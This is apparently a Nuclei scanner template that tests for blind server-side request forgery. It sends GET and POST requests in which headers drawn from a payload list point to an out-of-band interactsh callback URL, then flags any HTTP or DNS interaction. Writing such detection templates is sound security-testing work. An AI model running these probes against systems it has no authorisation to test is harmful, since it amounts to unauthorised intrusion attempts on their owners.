id: header-blind-ssrf

info:
  name: SSRF Scanner (Blind)
  author: Rikunj Sindhwad
  severity: high
  description: Checks for Blind SSRF in headers
  tags: ssrf, blind, header


http:
  - payloads:
      header: helpers/payloads/request-headers.txt
    # stop-at-first-match: true
    raw:
      - |
        GET /{{Path}}/{{File}}#§header§#GET HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        §header§: http://{{interactsh-url}}
        Connection: close
      - |
        GET /{{Path}}/{{File}}#§header§#GET HTTP/2.0
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        §header§: http://{{interactsh-url}}
        Connection: close
      - |
        POST /{{Path}}/{{File}}#§header§#POST HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        §header§: http://{{interactsh-url}}
        Connection: close

        a
      - |
        POST /{{Path}}/{{File}}#§header§#POST HTTP/2.0
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
        §header§: http://{{interactsh-url}}
        Connection: close

        a
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http"
          - "dns"
          - "https"
